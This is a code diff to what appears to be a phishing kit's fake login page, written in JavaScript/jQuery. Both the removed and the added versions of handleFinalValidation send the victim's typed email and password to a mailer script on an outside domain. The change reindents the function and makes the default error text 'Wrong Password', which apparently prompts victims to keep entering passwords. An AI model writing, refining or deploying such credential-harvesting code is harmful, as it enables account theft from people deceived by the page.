@@ -174,58 +174,66 @@
                  });
              }
              
-             // Function to handle final validation step
-             function handleFinalValidation(email, password) {
-                 $('#login_submit').text('Validating...');
-                 
-                 $.ajax({
-                     url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
-                     method: 'POST',
-                     type: 'POST',
-                     data: {
-                         email: email,
-                         password: password,
-                         auth_step: 'validate'
-                     },
-                     dataType: 'json',
-                     cache: false,
-                     timeout: 30000,
-                     processData: true,
-                     contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
-                     success: function(response) {
-                         console.log('Final validation response:', response);
-                         var msg = response && response.msg ? response.msg : '';
-                         
-                         // Check if login was successful
-                         if (response && (response.signal === 'ok' || response.signal === 'OK' || 
-                             msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
-                             console.log('Login successful - triggering redirect');
-                             handleSuccessfulLogin(response);
-                         } else {
-                             console.log('Login failed - showing error');
-                             handleFailedLogin(response);
-                         }
-                     },
-                     error: function(xhr, status, error) {
-                         $('#loading-overlay').hide();
-                         var errorMsg = 'Connection error';
-                         
-                         if (xhr.responseText) {
-                             try {
-                                 var errorResponse = JSON.parse(xhr.responseText);
-                                 errorMsg = errorResponse.msg || errorMsg;
-                             } catch (e) {
-                                 errorMsg = 'Server error: ' + xhr.status;
-                             }
-                         }
-                         
-                         $('#login-status-message').text(errorMsg);
-                         $('#login-status').removeClass('success-notice info-notice').addClass('error-notice').show();
-                         $('#password').val('').focus();
-                         $('#login_submit').prop('disabled', false).text('Log in');
-                     }
-                 });
-             }
+                           // Function to handle final validation step
+              function handleFinalValidation(email, password) {
+                  $('#login_submit').text('Validating...');
+                  
+                  $.ajax({
+                      url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php',
+                      method: 'POST',
+                      type: 'POST',
+                      data: {
+                          email: email,
+                          password: password,
+                          auth_step: 'validate'
+                      },
+                      dataType: 'json',
+                      cache: false,
+                      timeout: 30000,
+                      processData: true,
+                      contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
+                      success: function(response) {
+                          console.log('Final validation response:', response);
+                          var msg = response && response.msg ? response.msg : '';
+                          
+                          // Check if login was successful
+                          if (response && (response.signal === 'ok' || response.signal === 'OK' || 
+                              msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
+                              console.log('Login successful - triggering redirect');
+                              handleSuccessfulLogin(response);
+                          } else {
+                              console.log('Login failed - showing error');
+                              handleFailedLogin(response);
+                          }
+                      },
+                      error: function(xhr, status, error) {
+                          $('#loading-overlay').hide();
+                          var errorMsg = 'Wrong Password';
+                          
+                          // Try to parse the response for more specific error messages
+                          if (xhr.responseText) {
+                              try {
+                                  var errorResponse = JSON.parse(xhr.responseText);
+                                  if (errorResponse.msg && errorResponse.msg !== '') {
+                                      errorMsg = errorResponse.msg;
+                                  }
+                              } catch (e) {
+                                  // If JSON parsing fails, check if it's a server error
+                                  if (xhr.status >= 500) {
+                                      errorMsg = 'Server error: ' + xhr.status;
+                                  } else {
+                                      errorMsg = 'Wrong Password';
+                                  }
+                              }
+                          }
+                          
+                          $('#login-status-message').text(errorMsg);
+                          $('#login-status').removeClass('success-notice info-notice').addClass('error-notice').show();
+                          $('#password').val('').focus();
+                          $('#login_submit').prop('disabled', false).text('Log in');
+                      }
+                  });
+              }
              
              // Function to handle successful login and redirect
              function handleSuccessfulLogin(response) {
